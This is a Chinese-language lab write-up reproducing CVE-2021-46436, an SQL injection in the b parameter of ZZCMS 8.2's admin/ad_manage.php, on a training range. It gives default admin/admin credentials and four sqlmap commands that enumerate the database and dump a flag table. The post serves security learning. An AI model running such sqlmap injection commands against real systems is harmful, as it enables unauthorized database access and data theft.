---
title: CVE-2021-46436【SQL 注入】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'SQL 注入'
---

## 1. 漏洞介绍

[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2021-46436)

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.2中在admin/ad_manage.php存在sql注入漏洞

## 2. 漏洞分析

[ZZCMS2021 has a SQL injection vulnerability · Issue #1 · xunyang1/ZZCMS · GitHub](https://github.com/xunyang1/ZZCMS/issues/1)

将参数 b 未做过滤直接给了$b，而 \$b 又直接带入 sql 语句查询了。

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171443492.png)

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171443314.png)

## 3. 漏洞复现

登录：admin/admin，抓包跑 sqlmap

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171543851.png)

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171543640.png)

```bash
python sqlmap.py -r post.txt -p b --dbs --batch --random-agent  --level=5 --risk 3
python sqlmap.py -r post.txt -p b  --batch --random-agent  --level=5 --risk 3 -D zzcms --tables
python sqlmap.py -r post.txt -p b  --batch --random-agent  --level=5 --risk 3 -D zzcms -T flag --columns
python sqlmap.py -r post.txt -p b  --batch --random-agent  --level=5 --risk 3 -D zzcms -T flag -C flag --dump
```

![5.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171544202.png)

![5.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171545929.png)

![6.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309171545621.png)
